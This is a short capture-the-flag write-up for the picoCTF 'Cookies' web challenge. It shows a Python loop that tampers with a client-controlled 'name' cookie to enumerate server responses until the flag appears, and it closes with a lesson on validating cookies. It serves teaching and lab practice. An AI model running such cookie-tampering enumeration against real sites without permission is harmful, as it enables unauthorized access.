---
title: "PicoCTF Web Exploitation: Cookies"
description: "A short writeup on manipulating a client-controlled cookie to enumerate server responses and recover the flag."
locale: "en"
publishDate: 2026-07-15
draft: false
featured: true
tags:
  - web
  - picoctf
author: "kwpwn"
---

## Challenge overview

The application displays a different message based on the value of a `name`
cookie. Because the value is controlled entirely by the client, it is a useful
place to begin testing.

## Enumeration

After submitting the form once, the response sets the following cookie:

```http
Set-Cookie: name=0
```

Changing the value returns different cookie names. A small loop is enough to
enumerate the valid range:

```python
import requests

url = "https://challenge.example/check"

for value in range(30):
    response = requests.get(url, cookies={"name": str(value)})
    if "picoCTF{" in response.text:
        print(response.text)
        break
```

## Takeaway

Cookies are user input. A server must validate them in the same way it validates
query parameters, form fields, and request headers.
